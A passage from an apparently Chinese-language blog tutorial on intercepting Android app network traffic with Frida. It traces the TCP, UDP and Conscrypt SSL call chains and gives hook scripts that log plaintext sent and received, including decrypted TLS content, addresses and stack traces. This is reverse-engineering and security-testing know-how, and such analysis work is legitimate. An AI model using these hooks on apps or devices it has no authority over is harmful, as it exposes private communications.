class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isprintable</span>(<span class="params">value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (value&gt;=<span class="number">32</span> &amp;&amp; value&lt;=<span class="number">126</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hooktcp</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">SocketClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.net.Socket&quot;</span>)</span><br><span class="line">        <span class="title class_">SocketClass</span>.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg0, arg1</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]new Socket connection:&quot;</span> + arg0 + <span class="string">&quot;port:&quot;</span> + arg1)</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.$init(arg0, arg1)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">SocketInputStreamClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.net.SocketInputStream&quot;</span>)</span><br><span class="line">        <span class="title class_">SocketInputStreamClass</span>.<span class="property">socketRead0</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg0, arg1, arg2, arg3, arg4</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> size = <span class="variable language_">this</span>.<span class="title function_">socketRead0</span>(arg0, arg1, arg2, arg3, arg4)</span><br><span class="line">            <span class="comment">//console.log(&quot;[&quot; + Process.getCurrentThreadId() + &quot;]socketRead0:size:&quot; + size + &quot;--content:&quot; + JSON.stringify(arg1))</span></span><br><span class="line">            <span class="keyword">var</span> bytearray = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&#x27;byte&#x27;</span>, arg1)</span><br><span class="line">            <span class="keyword">var</span> content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;size; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_">isprintable</span>(bytearray[i]))</span><br><span class="line">                    content = content + <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(bytearray[i])</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> socketimpl = <span class="variable language_">this</span>.<span class="property">impl</span>.<span class="property">value</span></span><br><span class="line">            <span class="keyword">var</span> address = socketimpl.<span class="property">address</span>.<span class="property">value</span></span><br><span class="line">            <span class="keyword">var</span> port = socketimpl.<span class="property">port</span>.<span class="property">value</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\naddress:&quot;</span> + address + <span class="string">&quot;,port:&quot;</span> + port + <span class="string">&quot;\n&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">this</span>.<span class="property">socket</span>.<span class="property">value</span>) + <span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]reveive:&quot;</span> + content)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()))</span><br><span class="line">            <span class="keyword">return</span> size</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">SocketOutputStreamClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.net.SocketOutputStream&quot;</span>)</span><br><span class="line">        <span class="title class_">SocketOutputStreamClass</span>.<span class="property">socketWrite0</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg0, arg1, arg2, arg3</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">socketWrite0</span>(arg0, arg1, arg2, arg3)</span><br><span class="line">        <span class="comment">//console.log(&quot;[&quot; + Process.getCurrentThreadId() + &quot;]socketWrite0:len:&quot; + arg3 + &quot;--content:&quot; + JSON.stringify(arg1))</span></span><br><span class="line">            <span class="keyword">var</span> bytearray = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&#x27;byte&#x27;</span>, arg1)</span><br><span class="line">            <span class="keyword">var</span> content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;arg3; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_">isprintable</span>(bytearray[i]))</span><br><span class="line">                    content = content + <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(bytearray[i])</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> socketimpl = <span class="variable language_">this</span>.<span class="property">impl</span>.<span class="property">value</span></span><br><span class="line">            <span class="keyword">var</span> address = socketimpl.<span class="property">address</span>.<span class="property">value</span></span><br><span class="line">            <span class="keyword">var</span> port = socketimpl.<span class="property">port</span>.<span class="property">value</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\nsend address:&quot;</span> + address + <span class="string">&quot;,port:&quot;</span> + port + <span class="string">&quot;\n&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">this</span>.<span class="property">socket</span>.<span class="property">value</span>) + <span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]send:&quot;</span> + content)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()))</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">hooktcp</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/bdcbf47/1.1.2.png" class=""><h2 id="1-2-UDP"><a href="#1-2-UDP" class="headerlink" title="1.2 UDP"></a>1.2 UDP</h2><p>追踪安卓源码分析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">发送数据：java.net.DatagramSocket.send-&gt;</span><br><span class="line">PlainDatagramSocketImpl.send-&gt;</span><br><span class="line">IoBridge.sendto(fd, p.getData(), p.getOffset(), p.getLength(), 0, address, port)-&gt;</span><br><span class="line">Libcore.os.sendto(fd, bytes, byteOffset, byteCount, flags, inetAddress, port)-&gt;</span><br><span class="line">sendtoBytes(FileDescriptor fd, Object buffer, int byteOffset, int byteCount, int flags, InetAddress inetAddress, int port)(jni函数)</span><br><span class="line">或</span><br><span class="line">sendtoBytes(FileDescriptor fd, Object buffer, int byteOffset, int byteCount, int flags, SocketAddress address)(jni函数)</span><br><span class="line"></span><br><span class="line">接收数据：java.net.DatagramSocket.receive-&gt;</span><br><span class="line">AbstractPlainDatagramSocketImpl.reveive-&gt;</span><br><span class="line">PlainDatagramSocketImpl.reveive0-&gt;</span><br><span class="line">doRecv-&gt;</span><br><span class="line">IoBridge.recvfrom-&gt;</span><br><span class="line">BlockGuardOs.recvfrom-&gt;</span><br><span class="line">Linux.recvfrom-&gt;</span><br><span class="line">recvfromBytes(FileDescriptor fd, Object buffer, int byteOffset, int byteCount, int flags, InetSocketAddress srcAddress)(jni函数)</span><br></pre></td></tr></table></figure><p>hook API：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isprintable</span>(<span class="params">value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (value&gt;=<span class="number">32</span> &amp;&amp; value&lt;=<span class="number">126</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookudp</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;               </span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">LinuxClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;libcore.io.Linux&quot;</span>)</span><br><span class="line">        <span class="title class_">LinuxClass</span>.<span class="property">recvfromBytes</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg0, arg1, arg2, arg3, arg4, arg5</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> size = <span class="variable language_">this</span>.<span class="title function_">recvfromBytes</span>(arg0, arg1, arg2, arg3, arg4, arg5)</span><br><span class="line">            <span class="keyword">var</span> bytearray = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&#x27;byte&#x27;</span>, arg1)</span><br><span class="line">            <span class="keyword">var</span> content = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;size; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_">isprintable</span>(bytearray[i]))</span><br><span class="line">                    content = content + <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(bytearray[i])</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;address:&quot;</span> + arg5 + <span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]recvfromBytes:size:&quot;</span> + size + <span class="string">&quot;--content:&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(arg1) + <span class="string">&quot;\n&quot;</span> + content)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()))</span><br><span class="line">            <span class="keyword">return</span> size</span><br><span class="line">        &#125;      </span><br><span class="line">        </span><br><span class="line">        <span class="title class_">LinuxClass</span>.<span class="property">sendtoBytes</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.io.FileDescriptor&#x27;</span>,<span class="string">&#x27;java.lang.Object&#x27;</span>,<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;java.net.InetAddress&#x27;</span>,<span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg0, arg1, arg2, arg3, arg4, arg5, arg6</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> size = <span class="variable language_">this</span>.<span class="title function_">sendtoBytes</span>(arg0, arg1, arg2, arg3, arg4, arg5, arg6)</span><br><span class="line">            <span class="keyword">var</span> bytearray = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&#x27;byte&#x27;</span>, arg1)</span><br><span class="line">            <span class="keyword">var</span> content = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;size; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_">isprintable</span>(bytearray[i]))</span><br><span class="line">                    content = content + <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(bytearray[i])</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;address:&quot;</span> + arg5 + <span class="string">&quot;,port:&quot;</span> + arg6 + <span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]sendtoBytes1:len:&quot;</span> + size + <span class="string">&quot;--content:&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(arg1) + <span class="string">&quot;\n&quot;</span> + content)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()))</span><br><span class="line">            <span class="keyword">return</span> size</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="title class_">LinuxClass</span>.<span class="property">sendtoBytes</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.io.FileDescriptor&#x27;</span>,<span class="string">&#x27;java.lang.Object&#x27;</span>,<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;java.net.SocketAddress&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg0, arg1, arg2, arg3, arg4, arg5</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> size = <span class="variable language_">this</span>.<span class="title function_">sendtoBytes</span>(arg0, arg1, arg2, arg3, arg4, arg5)</span><br><span class="line">            <span class="keyword">var</span> bytearray = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&#x27;byte&#x27;</span>, arg1)</span><br><span class="line">            <span class="keyword">var</span> content = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;size; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_">isprintable</span>(bytearray[i]))</span><br><span class="line">                    content = content + <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(bytearray[i])</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;address&quot;</span> + arg5 + <span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]sendtoBytes2:len:&quot;</span> + size + <span class="string">&quot;--content:&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(arg1) + <span class="string">&quot;\n&quot;</span> + content)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()))</span><br><span class="line">            <span class="keyword">return</span> size</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">hookudp</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/bdcbf47/1.2.1.png" class=""><h1 id="2-Java层SSL通信抓包"><a href="#2-Java层SSL通信抓包" class="headerlink" title="2. Java层SSL通信抓包"></a>2. Java层SSL通信抓包</h1><p>在安卓8.0上追踪okHttp框架层源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sslSocket-&gt;com.android.org.conscrypt.OpenSSLSocketImplWrapper</span><br><span class="line"></span><br><span class="line">发送数据：com.android.rog.conscrypt.OpenSSLSocketImpl$SSLSocketOutputStream-&gt;</span><br><span class="line">public void write(int oneByte)</span><br><span class="line">或</span><br><span class="line">public void write(byte[] buf, int offset, int byteCount)-&gt;</span><br><span class="line">NativeCrypto.SSL_write(sslNativePointer, Platform.getFileDescriptor(socket), OpenSSLSocketImpl.this, buf, offset, byteCount, writeTimeoutMilliseconds)(jni函数)-&gt;com.android.org.conscrypt.NativeCrypto</span><br><span class="line"></span><br><span class="line">接收数据：com.android.rog.conscrypt.OpenSSLSocketImpl$SSLSocketInputStream-&gt;</span><br><span class="line">public int read()</span><br><span class="line">或</span><br><span class="line">public int read(byte[] buf, int offset, int byteCount)-&gt;</span><br><span class="line">NativeCrypto.SSL_read(sslNativePointer, Platform.getFileDescriptor(socket), OpenSSLSocektImpl.this, buf, offset, byteCount, getSoTimeout())(jni函数)-&gt;com.android.org.conscrypt.NativeCrypto</span><br></pre></td></tr></table></figure><p>如果不知道它的包名是什么，可以用枚举列出该程序的完整包名。</p><img src="/posts/bdcbf47/2.1.3.png" class=""><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">enumerate</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClassesSync</span>().<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">classname</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (classname.<span class="title function_">indexOf</span>(<span class="string">&quot;NativeCrypto&quot;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(classname)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>hook ssl：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isprintable</span>(<span class="params">value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (value&gt;=<span class="number">32</span> &amp;&amp; value&lt;=<span class="number">126</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookssl</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;      </span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">NativeCryptoClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.org.conscrypt.NativeCrypto&quot;</span>)</span><br><span class="line">        <span class="title class_">NativeCryptoClass</span>.<span class="property">SSL_read</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg0, arg1, arg2, arg3, arg4, arg5, arg6</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> size = <span class="variable language_">this</span>.<span class="title function_">SSL_read</span>(arg0, arg1, arg2, arg3, arg4, arg5, arg6)</span><br><span class="line">            <span class="keyword">var</span> bytearray = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&#x27;byte&#x27;</span>, arg3)</span><br><span class="line">            <span class="keyword">var</span> content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;size; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_">isprintable</span>(bytearray[i]))</span><br><span class="line">                    content = content + <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(bytearray[i])</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]ssl_read:&quot;</span> + content)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()))</span><br><span class="line">            <span class="keyword">return</span> size</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="title class_">NativeCryptoClass</span>.<span class="property">SSL_write</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg0, arg1, arg2, arg3, arg4, arg5, arg6</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">SSL_write</span>(arg0, arg1, arg2, arg3, arg4, arg5, arg6)</span><br><span class="line">            <span class="keyword">var</span> bytearray = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&#x27;byte&#x27;</span>, arg3)</span><br><span class="line">            <span class="keyword">var</span> content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;arg5; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_">isprintable</span>(bytearray[i]))</span><br><span class="line">                    content = content + <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(bytearray[i])</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]ssl_write:&quot;</span> + content)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()))</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">hookssl</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/bdcbf47/2.1.1.png" class=""><p>发送HTTPS注册包时也可以抓到相关信息：</p><img src="/posts/bdcbf47/2.1.2.png" class=""><p>但是<code>SSL_write()</code>和<code>SSL_read()</code>并没有提供IP地址与端口，所以我们还要hook能拿到IP地址和端口的方法，也就是hook它们的上层函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isprintable</span>(<span class="params">value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (value&gt;=<span class="number">32</span> &amp;&amp; value&lt;=<span class="number">126</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookssl2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;      </span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">SSLInputStreamClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.org.conscrypt.OpenSSLSocketImpl$SSLInputStream&quot;</span>)</span><br><span class="line">        <span class="title class_">SSLInputStreamClass</span>.<span class="property">read</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>,<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg0, arg1, arg2</span>)&#123;</span><br><span class="line">            <span class="comment">//获得内部类对象所属的外部类对象</span></span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">OpenSSLSocektImplobj</span> = <span class="variable language_">this</span>.<span class="property">this$0</span>.<span class="property">value</span></span><br><span class="line">            <span class="keyword">var</span> socketobj = <span class="title class_">OpenSSLSocektImplobj</span>.<span class="property">socket</span>.<span 